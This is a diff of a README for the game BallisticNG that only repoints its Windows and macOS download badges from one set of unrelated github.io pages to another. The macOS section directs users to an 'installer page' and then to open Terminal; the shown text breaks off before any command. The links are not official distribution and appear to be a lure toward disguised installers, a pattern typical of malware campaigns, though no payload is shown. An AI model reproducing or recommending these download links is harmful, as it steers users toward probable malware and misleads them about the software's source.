@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Download BallisticNG](https://img.shields.io/badge/⬇_Download_BallisticNG-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
+[![⬇ Download BallisticNG](https://img.shields.io/badge/⬇_Download_BallisticNG-E63946?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
 
 </div>
 
@@ -65,9 +65,9 @@ BallisticNG is a faithful modern tribute to the WipEout N64 era anti-gravity rac
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
 
 </div>
 
@@ -85,7 +85,7 @@ BallisticNG is a faithful modern tribute to the WipEout N64 era anti-gravity rac
 
 <div align="center">
 
-[![⬇ Download BallisticNG](https://img.shields.io/badge/⬇_Download_BallisticNG-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
+[![⬇ Download BallisticNG](https://img.shields.io/badge/⬇_Download_BallisticNG-E63946?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
 
 </div>
 
@@ -117,7 +117,7 @@ BallisticNG is a faithful modern tribute to the WipEout N64 era anti-gravity rac
 
 ## 🍎 macOS Installation
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -142,7 +142,7 @@ BallisticNG is a faithful modern tribute to the WipEout N64 era anti-gravity rac
 
 <div align="center">
 
-[![⬇ Download BallisticNG](https://img.shields.io/badge/⬇_Download_BallisticNG-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
+[![⬇ Download BallisticNG](https://img.shields.io/badge/⬇_Download_BallisticNG-E63946?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
 
 </div>
 
